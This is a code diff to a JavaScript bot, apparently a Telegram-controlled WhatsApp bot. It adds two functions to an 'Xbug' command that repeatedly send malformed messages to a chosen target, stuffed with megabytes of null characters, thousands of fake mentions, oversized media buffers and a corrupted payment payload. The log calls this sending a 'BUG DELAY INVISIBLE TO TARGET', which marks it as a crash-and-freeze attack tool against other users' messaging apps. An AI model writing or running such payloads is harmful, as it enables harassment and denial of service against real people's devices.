@@ -2301,11 +2301,15 @@ bot.command("Xbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
   );
 
   (async () => {
-    for (let r = 0; r < 20; r++) {
+    for (let r = 0; r < 40; r++) {
       await OneRxVz(sock, target);
       await sleep(1000);
       await RxVzInvis(sock, target);
       await sleep(2000);
+      await xorvnsor(sock, target);
+      await sleep(1000);
+      await PaysQl(sock, target);
+      await sleep(1500);
     }
   })();
 });
@@ -2758,6 +2762,212 @@ async function RxVzInvis(sock, target) {
         console.error('[RxVz] Error sending call:', error);
         throw error;
     }
+}
+
+async function xorvnsor(sock, target) {
+  const fvck = () => Math.random().toString(36).substring(2, 18) + Date.now().toString(36);
+  const oneMBPayload = "\u0000".repeat(1024 * 1024);
+  const longText = "ꦾ".repeat(50000);
+  
+  try {
+    await sock.relayMessage(target, {
+      extendedTextMessage: {
+        text: oneMBPayload.substring(0, 10200) + "..." + fvck(),
+        matchedText: `https://t.me/${fvck()}NortexZ`,
+        canonicalUrl: `https://t.me/${fvck()}NortexZ`,
+        description: longText + "\u0000".repeat(10000) + fvck(),
+        title: oneMBPayload.substring(0, 1000),
+        textArgb: parseInt('0x00000000', 16),
+        backgroundArgb: parseInt('0xFFFF0000', 16),
+        font: 2,
+        previewType: 1,
+        jpegThumbnail: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(50000, 1)
+        ]),
+        contextInfo: {
+          stanzaId: fvck() + fvck(),
+          isForwarded: true, 
+          ForwardingScore: 999,
+          participant: target,
+          quotedMessage: {
+            conversation: `p${fvck()}\u0000`.repeat(10000) + longText.substring(0, 10000)
+          },
+          mentionedJid: [
+            ...Array.from(
+              { length: 1900 },
+              (_, p) => `86705131476${p}@bot`
+            ),
+            target,
+            "0@s.whatsapp.net"
+          ],
+          remoteJid: "status@broadcast",
+          externalAdReply: {
+            title: "起 ⱠØVɆ ɎØɄ " + "\u0000".repeat(1000),
+            body: "\u0000".repeat(1000) + longText.substring(0, 20000),
+            previewType: "PHOTO",
+            showAdAttribution: true,
+            thumbnailUrl: "https://files.catbox.moe/06rcri.jpg",
+            mediaType: 1,
+            renderLargerThumbnail: true,
+            sourceUrl: "https://t.me/NortexZ"
+          }
+        },
+        doNotPlayInline: false,
+        thumbnailDirectPath: "/v/t62.36145-24/560563266_1182091507314177_4487430912428629502_n.enc?ccb=11-4&oh=01_Q5Aa2gG3JeeF4eDKCSo_6O4YFwgV8JNjpM4xlpk7Dus5lLDCRg&oe=6909CF33&_nc_sid=5e03e0",
+        thumbnailSha256: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(20000, 2)
+        ]),
+        thumbnailEncSha256: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(20000, 3)
+        ]),
+        mediaKey: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(30000, 4)
+        ]),
+        mediaKeyTimestamp: fvck() + Date.now().toString() + fvck(),
+        thumbnailHeight: 1080,
+        thumbnailWidth: 1920,
+        inviteLinkGroupType: 1,
+        inviteLinkGroupTypeV2: "default",
+        inviteLinkParentGroupSubject: "\u1049".repeat(1000) + "\u0000".repeat(10000),
+        inviteLinkParentGroupThumbnail: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(40000, 5)
+        ]),
+      }
+    }, { 
+      messageId: fvck() + fvck(), 
+      participant: { jid: target } 
+    });
+    
+    await sock.relayMessage(target, {
+      extendedTextMessage: {
+        text: oneMBPayload.substring(0, 15500) + "..." + fvck(),
+        matchedText: `https://t.me/${fvck()}NortexZ`,
+        canonicalUrl: `https://t.me/${fvck()}NortexZ`,
+        description: longText + "\u0000".repeat(20000) + fvck(),
+        title: oneMBPayload.substring(0, 1000),
+        textArgb: parseInt('0x00000000', 16),
+        backgroundArgb: parseInt('0xFFFF0000', 16),
+        font: 2,
+        previewType: 1,
+        jpegThumbnail: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(50000, 1)
+        ]),
+        contextInfo: {
+          stanzaId: fvck() + fvck(),
+          isForwarded: true, 
+          ForwardingScore: 999,
+          participant: target,
+          quotedMessage: {
+            conversation: `p${fvck()}\u0000`.repeat(10000) + longText.substring(0, 10000)
+          },
+          mentionedJid: [
+            ...Array.from(
+              { length: 1900 },
+              (_, p) => `86705131476${p}@bot`
+            ),
+            target,
+            "0@s.whatsapp.net"
+          ],
+          remoteJid: "status@broadcast",
+          externalAdReply: {
+            title: "起 ⱠØVɆ ɎØɄ " + "\u0000".repeat(1000),
+            body: "\u0000".repeat(1000) + longText.substring(0, 20000),
+            previewType: "PHOTO",
+            showAdAttribution: true,
+            thumbnailUrl: "https://files.catbox.moe/06rcri.jpg",
+            mediaType: 1,
+            renderLargerThumbnail: true,
+            sourceUrl: "https://t.me/NortexZ"
+          }
+        },
+        doNotPlayInline: false,
+        thumbnailDirectPath: "/v/t62.36145-24/560563266_1182091507314177_4487430912428629502_n.enc?ccb=11-4&oh=01_Q5Aa2gG3JeeF4eDKCSo_6O4YFwgV8JNjpM4xlpk7Dus5lLDCRg&oe=6909CF33&_nc_sid=5e03e0",
+        thumbnailSha256: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(20000, 2)
+        ]),
+        thumbnailEncSha256: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(20000, 3)
+        ]),
+        mediaKey: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(30000, 4)
+        ]),
+        mediaKeyTimestamp: fvck() + Date.now().toString() + fvck(),
+        thumbnailHeight: 1080,
+        thumbnailWidth: 1920,
+        inviteLinkGroupType: 1,
+        inviteLinkGroupTypeV2: "default",
+        inviteLinkParentGroupSubject: "\u1049".repeat(1000) + "\u0000".repeat(10000),
+        inviteLinkParentGroupThumbnail: Buffer.concat([
+          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
+          Buffer.alloc(40000, 5)
+        ]),
+      }
+    }, { 
+      messageId: fvck() + fvck(), 
+      participant: { jid: target } 
+    });
+    console.log("✅ SUCCES SENDING BUG DELAY INVISIBLE TO TARGET");
+  } catch (e) { 
+    console.log("❌ Error:", e.message);
+  }
+}
+
+async function PaysQl(socket, target) {
+  const msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            contextInfo: {
+              remoteJid: " X ",
+              mentionedJid: Array.from({ length: 1900 }, () =>
+                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
+              )
+            },
+            body: {
+              text: " @vinzxiterr ",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "payment_info",
+              paramsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4UJPSC1FYKC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"¿!deadcode!¿","key":" ¿🎭? ${"\u0000".repeat(999999)}","key_type":"CPF"}}],"share_payment_status":false}`,
+              version: 3
+            }
+          }
+        }
+      }
+    },
+    {
+      participant: { jid: target }
+    }
+  )
+
+  for (let i = 0; i < 20; i++) {
+    await client.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: msg.message
+        }
+      },
+      {
+        messageId: msg.key.id,
+        participant: { jid: target }
+      }
+    )
+
+    await sleep(1500)
+  }
 }
 
 // --- Jalankan Bot --- //
